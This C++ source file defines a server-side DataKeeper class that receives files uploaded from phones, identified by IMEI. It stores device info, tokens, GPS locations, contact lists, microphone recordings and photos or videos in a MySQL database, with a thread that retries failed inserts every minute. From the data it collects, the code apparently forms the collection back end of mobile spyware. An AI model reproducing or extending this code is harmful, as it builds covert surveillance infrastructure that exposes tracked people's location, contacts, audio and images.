
#include "DataKeeper.h"
#include "IOSmysqlOper.h"
#include "PublicFunction.h"
#include "FileOperator.h"
#include "PhoneLocation.h"
#include "PhoneContacts.h"
#include "jsonParser.h"
#include <string>

using namespace std;

unordered_map <unsigned int, KEEPDATA> gMapKeepData;

static unsigned int g_number = 0;

CRITICAL_SECTION g_KeepDataCs = { 0 };

int DataKeeper::init() {
	InitializeCriticalSection(&g_KeepDataCs);
	return 0;
}

int DataKeeper::add(KEEPDATA data) {
	EnterCriticalSection(&g_KeepDataCs);
	gMapKeepData.insert(unordered_map<unsigned int, KEEPDATA>::value_type(g_number, data));
	g_number++;
	LeaveCriticalSection(&g_KeepDataCs);
	return 0;
}

int DataKeeper::keep(string filepath, string name, const char * data, int size, string username, string imei) {

	int ret = 0;
	char szout[1024];

	MySql::enter();
	MySql * mysql = new MySql();

	string filename = filepath + name;

	__try {
		string clientid = mysql->getIdFromClient(imei);

		if (strstr(filename.c_str(), DEVICEINFO_FILENAME))
		{
			string info = string(data, size);
			string token = JsonParser::getStringValue(info, "token");
			ret = mysql->insertClient(clientid, username, imei, info, token);
		}
		else if (strstr(filename.c_str(), LOCATION_FILENAME))
		{
			string lat = "";
			string lon = "";
			string strtime = "";
			string info = "";
			PhoneLocation::splitLocation(string(data, size), lat, lon, info, strtime);
			ret = mysql->insertLocation(clientid, info, lat, lon, strtime);
		}
		else if (strstr(filename.c_str(), CONTACTS_FILENAME))
		{
			vector <string> vectors = JsonParser::getJsonFromArray(string(data, size));
			for (unsigned int i = 0; i < vectors.size(); i++)
			{
				string username = "";
				string phone = "";
				PhoneContacts::splitContacts(vectors[i], username, phone);
				ret = mysql->insertContacts(clientid, username, phone);
			}
		}
		else if (strstr(filename.c_str(), ".token"))
		{
			string token = string(data, size);
			if (token != "")
			{
				ret = mysql->insertToken(clientid, string(data, size));
			}
		}
		else if (strstr(filename.c_str(), "_microaudio.wav") )
		{
			ret = mysql->insertAudio(clientid, filename.c_str(), size);
		}
		else if (strstr(filename.c_str(), ".jpg") || strstr(filename.c_str(), ".png") || strstr(filename.c_str(), ".jpeg") ||
			strstr(filename.c_str(), ".PNG") || strstr(filename.c_str(), ".JPG") || strstr(filename.c_str(), ".JPEG") ||
			strstr(filename.c_str(), ".HEIC") || strstr(filename.c_str(), ".heic") || 
			strstr(filename.c_str(), ".GIF") || strstr(filename.c_str(), ".gif") ||
			strstr(filename.c_str(), ".MP4") || strstr(filename.c_str(), ".mov")||
			strstr(filename.c_str(), ".MOV") || strstr(filename.c_str(), ".mp4"))
		{
			ret = mysql->insertPhoto(clientid, "1", filename.c_str());
		}
		else if (strstr(filename.c_str(), RUNNING_LOG_FILENAME) )
		{
			ret = TRUE;
		}
		else {
			ret = mysql->insertPhoto(clientid, "1", filename.c_str());

			wsprintfA(szout, "unknown file name to insert into mysql,file name:%s\r\n", filename.c_str());
			WriteLogFile(szout);
		}
	}
	__except (1) {
		WriteLogFile("mysql exception\r\n");
	}

	if (ret <= 0)
	{
		mysql->recorderr();
	}

	delete mysql;
	MySql::leave();

	return ret;
}


int __stdcall DataKeeper::recommit() {

	InitializeCriticalSection(&g_KeepDataCs);

	int ret = 0;
	while (1)
	{

		EnterCriticalSection(&g_KeepDataCs);

		__try {
			unordered_map<unsigned int, KEEPDATA>::iterator it;

			for (it = gMapKeepData.begin(); it != gMapKeepData.end();)
			{
				KEEPDATA data = it->second;
				gMapKeepData.erase(it++);

				char * lpdata = 0;
				int filesize = 0;
				string filename = (data.filepath + data.filename);
				ret = FileOperator::fileReader(filename.c_str(), &lpdata, &filesize);
				if (ret > 0)
				{
					ret = keep(data.filepath, data.filename, lpdata, filesize, data.username, data.imei);
					delete lpdata;
				}
			}
		}
		__except (1) {
			printf("recommit exception\r\n");
			WriteLogFile("recommit exception\r\n");
		}

		LeaveCriticalSection(&g_KeepDataCs);

		Sleep(60000);
	}
	return 0;
}
